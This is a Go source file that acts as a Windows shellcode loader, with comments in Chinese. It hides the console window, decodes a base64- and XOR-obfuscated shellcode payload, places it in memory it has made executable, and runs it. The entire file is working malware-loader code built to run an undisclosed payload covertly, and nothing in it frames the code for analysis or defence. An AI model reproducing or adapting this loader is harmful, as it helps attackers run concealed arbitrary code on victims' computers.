package main

import (
	"encoding/base64"
	"syscall"
	"unsafe"

	"github.com/lxn/win"
	"golang.org/x/sys/windows"
)

func main() {
	// 通过 base64 和 XOR 解密 shellcode 内容
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	encryptedShellcode := "iz/0k4efv3d3dzYmNiclJiE/RqUSP/pGREdAQEdHT0ZPWQQfWRYHHhAAWQMSGRQSGQMUBFkUGBp3coKWdw=="
	decodedShellcode, _ := base64.StdEncoding.DecodeString(encryptedShellcode)
	for i := 0; i < len(decodedShellcode); i++ {
		decodedShellcode[i] ^= 0x77
	}

	// 获取 kernel32.dll 中的 VirtualAlloc 函数
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	VirtualAlloc, _ := kernel32.FindProc("VirtualAlloc")

	// 分配内存并写入 shellcode 内容
	allocSize := uintptr(len(decodedShellcode))
	mem, _, _ := VirtualAlloc.Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if mem == 0 {
		panic("VirtualAlloc failed")
	}
	buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, decodedShellcode)

	// 执行 shellcode
	syscall.Syscall(mem, 0, 0, 0, 0)
}
